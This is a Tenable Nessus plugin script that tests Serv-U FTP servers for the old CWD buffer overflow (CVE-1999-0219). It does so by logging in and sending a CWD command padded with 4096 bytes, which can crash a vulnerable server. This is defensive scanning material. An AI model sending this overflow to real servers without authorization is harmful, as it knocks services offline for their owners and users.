#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10089);
 script_bugtraq_id(269);
 script_version ("$Revision: 1.27 $");
 script_cve_id("CVE-1999-0219");
 script_xref(name:"OSVDB", value:"957");

 script_name(english:"Serv-U CWD Command Overflow");
 script_summary(english:"Attempts a CWD buffer overflow");

 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote FTP server is affected by a buffer overflow vulnerability.
A remote authenticated user can cause a denial of service via a long
'CWD' or 'LS' command. An attacker could exploit this to crash the
affected host." );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C" );

script_end_attributes();

 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_family(english:"FTP");
 script_dependencie("ftp_anonymous.nasl", "ftpserver_detect_type_nd_version.nasl");
 script_require_keys("ftp/login");
 script_exclude_keys("ftp/msftpd");
 script_require_ports("Services/ftp", 21);
 
 exit(0);
}

#
# The script code starts here
#


include("global_settings.inc");
include('ftp_func.inc');

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/ftp");
if(!port)port = 21;

if (get_kb_item('ftp/'+port+'/broken') || 
    get_kb_item('ftp/'+port+'/backdoor')) exit(0);

banner = get_ftp_banner(port:port);
if ( !banner || "Serv-U FTP Server" >!< banner ) exit(0);


login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

if(!login)exit(0);

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  if(ftp_authenticate(socket:soc, user:login, pass:password))
  {
   s = string("CWD ", crap(4096), "\r\n");
   send(socket:soc, data:s);
   r = recv_line(socket:soc, length:1024);
   if(!r)security_hole(port);
  }
  close(soc);
 }
}
